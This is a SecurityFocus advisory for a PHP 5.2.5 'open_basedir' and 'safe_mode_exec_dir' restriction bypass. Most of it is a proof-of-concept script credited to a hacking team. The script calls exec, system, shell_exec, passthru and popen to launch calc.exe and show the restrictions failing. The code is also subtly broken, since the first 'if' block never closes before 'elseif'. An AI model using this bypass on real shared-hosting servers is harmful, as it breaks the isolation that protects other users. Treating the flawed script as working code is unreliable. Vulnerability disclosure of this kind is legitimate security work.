source: http://www.securityfocus.com/bid/31064/info

PHP is prone to 'safe_mode_exec_dir' and 'open_basedir' restriction-bypass vulnerabilities. Successful exploits could allow an attacker to execute arbitrary code.

These vulnerabilities would be an issue in shared-hosting configurations where multiple users can create and execute arbitrary PHP script code; in such cases, the 'safe_mode' and 'open_basedir' restrictions are expected to isolate users from each other.

PHP 5.2.5 is vulnerable; other versions may also be affected. 

<?php
print_r('----------------------------------------------------------------------------------------
 PHP 5.2.5 Multiple Function "open_basedir" and "safe_mode_exec_dir" Restriction Bypass
----------------------------------------------------------------------------------------
-------------------------------------
 author: Ciph3r
 mail: Ciph3r_blackhat@yahoo.com
 site: www.expl0iters.ir
 S4rK3VT Hacking TEAM
 we are : Ciph3r & Rake
 Sp Tanx2 : Iranian Hacker & kurdish Security TEAM
-------------------------------------
-------------------------------------
 Remote execution:      No
 Local execution:       Yes
-------------------------------------
---------------------------------------------
 PHP.INI settings:
 safe_mode = Off
 disable_functions =
 open_basedir = htdocs          <-- bypassed
 safe_mode_exec_dir = htdocs    <-- bypassed
---------------------------------------------
-------------------------------------------------------------------------------------------
 Description:
 Functions "exec", "system", "shell_exec", "passthru", "popen", if invoked from local,
 are not properly checked and bypass "open_basedir" and "safe_mode_exec_dir" restrictions:
-------------------------------------------------------------------------------------------

');

$option = $argv[1];

if ($option=="1"){
        exec('c:/windows/system32/calc.exe');
        echo '"exec" test completed';

elseif($option=="2"){
        system('c:/windows/system32/calc.exe');
        echo '"system" test completed';
}
elseif($option=="3"){
        shell_exec('c:/windows/system32/calc.exe');
        echo '"shell_exec test" completed';
}
elseif($option=="4"){
        passthru('c:/windows/system32/calc.exe');
        echo '"passthru" test completed';
}
elseif($option=="5"){
        popen('c:/windows/system32/calc.exe','r');
        echo '"popen" test completed';
}
elseif($option==6){
        exec('c:/windows/system32/calc.exe');
        echo "exec test completed\n";
        system('c:/windows/system32/calc.exe');
        echo "system test completed\n";
        shell_exec('c:/windows/system32/calc.exe');
        echo "shell_exec test completed\n";
        passthru('c:/windows/system32/calc.exe');
        echo "passthru test completed\n";
        popen('c:/windows/system32/calc.exe','r');
        echo "popen test completed\n";
}
else{
        print_r('--------------------------------------
 Usage:
 php poc.php 1 => for "exec" test
 php poc.php 2 => for "system" test
 php poc.php 3 => for "shell_exec" test
 php poc.php 4 => for "passthru" test
 php poc.php 5 => for "popen" test
 php poc.php 6 => for "all in one" test
--------------------------------------
');
}
?>